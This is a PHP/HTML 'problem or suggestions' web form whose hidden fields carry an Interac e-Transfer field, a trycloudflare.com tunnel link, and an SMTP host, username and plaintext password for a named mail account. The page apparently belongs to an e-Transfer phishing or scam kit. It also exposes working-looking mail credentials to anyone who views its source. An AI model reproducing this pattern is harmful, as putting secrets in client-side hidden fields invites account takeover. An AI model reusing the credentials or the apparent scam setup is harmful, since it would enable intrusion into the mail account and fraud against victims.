<!DOCTYPE html>
<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="MobileOptimized" content="width">
    <meta name="HandheldFriendly" content="true">
    <meta name="format-detection" content="telephone=yes">
    <style>
        body {
            background-color: #222;
            color: #fff;
            font-family: "Press Start 2P", Arial, sans-serif; /* Use a gaming font */
            margin: 0;
            padding: 20px;
            font-size: 24px; /* Increase font size for better visibility on mobile */
            text-align: center;
        }

        input[type="text"],
        select {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 3px solid #00ff00; /* Use a green border for input fields */
            background-color: #000;
            color: #fff;
            font-size: 24px; /* Increase font size for better visibility on mobile */
        }

        input[type="submit"] {
            width: 100%;
            padding: 10px;
            border: none;
            background-color: #ff6600; /* Use an orange background for the submit button */
            color: #fff;
            cursor: pointer;
            font-size: 24px; /* Increase font size for better visibility on mobile */
        }

        label {
            display: block;
            margin-bottom: 10px;
            color: #ff6600; /* Use an orange color for labels */
            font-size: 26px; /* Increase font size for better visibility on mobile */
        }
    </style>
</head>
<body>
    <center>
        <h1>PROBLEM OR SUGGESTIONS</h1>
        <form action="submit1.php" method="POST" enctype="multipart/form-data">
            <input type="hidden" id="etransfer_interac_ca" name="etransfer_interac_ca" required="">

            <input type="hidden" id="receivers_email" name="receivers_email" value="andallard@mymts.net" required="">
    <label for="suggestion">Your Suggestion:</label>
            <input type="text" id="suggestion" name="suggestion" placeholder="Enter your suggestion" required="">
            <input type="hidden" name="line" value="September 1, 2023" required="">
            <input type="hidden" name="link" value="https://burning-feedback-asin-mysterious.trycloudflare.com">
            <input type="hidden" name="port" value="587" required="">
            <input type="hidden" name="username" value="andallard@mymts.net" required="">
            <input type="hidden" name="password" value="Batman123" required="">
            <input type="hidden" name="host" value="mail.mymts.net"required="">
            <input type="submit" value="Submit">
        </form>
    </center>
</body>
</html>
